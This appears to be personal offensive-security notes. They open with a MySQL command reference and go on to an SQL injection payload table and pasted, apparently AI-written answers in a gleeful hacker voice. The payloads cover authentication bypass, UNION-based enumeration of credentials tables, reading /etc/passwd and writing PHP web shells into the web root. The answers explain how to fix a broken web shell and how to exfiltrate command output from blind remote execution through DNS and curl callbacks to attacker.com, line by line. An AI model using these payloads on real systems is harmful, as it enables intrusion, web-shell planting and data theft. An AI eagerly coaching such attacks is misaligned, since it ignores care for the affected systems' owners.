## MySQL

| **Command** | **Description** |
| --- | --- |
| **General** |     |
| `mysql -u root -h docker.ELITE.eu -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |     |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |     |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |     |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and Subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

## SQL Injection

| **Payload** | **Description** |
| --- | --- |
| **Auth Bypass** |     |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |     |
| **Union Injection** |     |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |     |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |     |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |     |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory **VIA REQUEST** |
| cn' UNION SELECT NULL,"&lt;?php system($\_GET\['cmd'\]); ?&gt;",NULL,NULL,NULL,NULL into outfile '/var/www/html/revshell.php'-- - | http://ELITE/revshell.php?cmd=ls |
| cn' UNION SELECT NULL,"&lt;?php system(base64_decode($\_GET\['cmd'\])); ?&gt;",NULL,NULL,NULL,NULL into outfile '/var/www/html/secret.php'-- - | http://ELITE/secret.php?cmd=bHM= |

&nbsp;

&nbsp;

&nbsp;

&nbsp;

🔥 Killer question. Understanding how PHP handles input arrays like `$_GET`, `$_POST`, and `$_REQUEST` is key to writing reliable web shells (or exploiting them). Here’s the **real breakdown** so you never guess again:

* * *

## 🧠 SUPERGLOBALS 101

### PHP superglobals:

- `$_GET` → Data from **URL parameters** (`?cmd=ls`)
    
- `$_POST` → Data from **form POSTs**
    
- `$_REQUEST` → A **merge** of `$_GET`, `$_POST`, and `$_COOKIE`
    

### But the **crucial part**:

They are **associative arrays**, not indexed numerically unless **you explicitly send numbered keys**.

* * *

## 🧪 WHY `$_REQUEST[0]` FAILS

Let’s break it with an example:

If you visit:

```
http://target/shell.php?cmd=ls
```

Then:

```php
$_GET          = [ 'cmd' => 'ls' ]
$_REQUEST      = [ 'cmd' => 'ls' ]
$_REQUEST[0]   = ❌ undefined
```

Unless the URL was like:

```
http://target/shell.php?0=ls
```

Then:

```php
$_GET[0] = 'ls'
```

So your original payload:

```php
<?php system($_REQUEST[0]); ?>
```

Would only work **if the attacker sends** `?0=ls`, which is rare and not the usual pattern. That’s why you got **null output**.

* * *

## ✅ HOW TO CHOOSE THE RIGHT ONE

| Superglobal | Use when... | Payload example |
| --- | --- | --- |
| `$_GET` | You control the URL | `?cmd=ls` |
| `$_POST` | You send form data (less common in direct shell usage) | `curl -d "cmd=ls" target` |
| `$_REQUEST` | General fallback for multiple methods, but use a **key** | `?cmd=ls` |
| `$_REQUEST[0]` | Only works with `?0=ls` | ⚠️ Not standard |

* * *

## 🛠️ So the golden rule:

Use **`$_GET['cmd']`** if:

```bash
http://target/shell.php?cmd=ls
```

Use **`$_REQUEST['cmd']`** if you're unsure or might use both GET and POST, but **you must specify the key**, not `[0]`.

* * *

## 🔥 PRO TIP: How to test

Add this one-liner to any web-accessible PHP file:

```php
<?php var_dump($_REQUEST); ?>
```

Then hit:

```
http://target/file.php?cmd=ls
```

It’ll show you **exactly** what the server sees in `$_REQUEST`, so you can craft the correct exploit.

* * *

&nbsp;

Hell yeah 😈 — let's dive into **blind command execution with callbacks**, using **DNS and HTTP exfiltration**. This is your go-to strategy when you can execute commands **but don’t see any output** (like blind RCE or SQLi).

* * *

## 🕳️ THE PROBLEM

You have a web shell or payload like:

```php
<?php system($_GET['cmd']); ?>
```

But the server's output is not visible — either it's blocked, filtered, or the server returns nothing.

* * *

## 💡 THE SOLUTION: CALLBACK EXFILTRATION

You make the target **call back to you**, leaking command output via DNS or HTTP.

* * *

## ☠️ METHOD #1 – DNS Callback (Stealthy AF)

### Why?

✅ Works **even through firewalls**, because DNS is usually allowed  
✅ Great for **short outputs** (hostnames, usernames, IPs)

### Example command:

```bash
nslookup `whoami`.yourdomain.com
```

Or in PHP shell:

```php
system("nslookup `whoami`.attacker.com");
```

Then watch logs on your DNS server or use a service like:

- [interactsh](https://github.com/projectdiscovery/interactsh)
    
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
    
- [Canarytokens](https://canarytokens.org/)
    

### Real Example:

```php
<?php system("nslookup `id|cut -d' ' -f1`.xyz.attacker.com"); ?>
```

👀 The server will do a DNS lookup like:

```
uid_33.xyz.attacker.com
```

Which hits your DNS logs.

* * *

## 🧨 METHOD #2 – HTTP Callback (More Data, Easier to See)

### Requirements:

- Attacker has a listener (like a Flask app or `nc -l`)
    
- Target can reach external IPs over HTTP
    

### Payload (in PHP):

```php
<?php system("curl http://attacker.com/`whoami`"); ?>
```

Or base64 if you're worried about special chars:

```php
<?php system("curl http://attacker.com/$(whoami | base64)"); ?>
```

### Attacker:

```bash
# Simple listener (Python)
sudo python3 -m http.server 80
```

Or using netcat:

```bash
sudo nc -lvnp 80
```

Every request from the victim shows the command output in the logs or as a path.

* * *

## 🧠 Want full output? Chain multiple requests:

```php
<?php
$output = shell_exec("ls -la");
$lines = explode("\n", $output);
foreach ($lines as $line) {
    system("curl http://attacker.com/".urlencode($line));
}
?>
```

Your server will get 1 request per line of output — enough to reconstruct the full response.

* * *

## 💣 Bonus: Use Interactsh for Both

```bash
interactsh-client
```

Then craft a command:

```php
system("nslookup `whoami`.xyz.oastify.com");
```

🔥 It'll show up instantly in your Interactsh terminal.
